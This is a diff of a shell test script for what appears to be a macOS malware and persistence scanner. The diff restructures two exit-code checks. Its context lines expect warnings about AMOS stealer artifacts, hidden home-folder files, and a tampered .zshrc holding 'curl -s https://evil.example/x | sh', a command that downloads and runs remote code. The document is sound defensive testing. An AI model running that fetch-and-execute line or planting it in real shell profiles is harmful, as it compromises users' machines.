@@ -38,7 +38,9 @@ reject 'ls -la'                                                         "benign 
 expect "Known stealer artifact present: $FAKE/.agent"                   "AMOS ~/.agent artifact"
 expect "Hidden file in a shared/home location: $FAKE/.helper"           "hidden executable in home"
 expect '[WARN] .zshrc line 2:curl -s https://evil.example/x | sh'       "tampered .zshrc"
-[ "$code" -eq 1 ] && echo "pass: exit code 1 on warnings" || { echo "FAIL: exit code $code, expected 1"; fail=1; }
+if [ "$code" -eq 1 ]; then echo "pass: exit code 1 on warnings"
+else echo "FAIL: exit code $code, expected 1"; fail=1; fi
 
-[ "$fail" -eq 0 ] && echo "All tests passed." || { echo; echo "--- tool output ---"; echo "$out"; }
+if [ "$fail" -eq 0 ]; then echo "All tests passed."
+else echo; echo "--- tool output ---"; echo "$out"; fi
 exit "$fail"
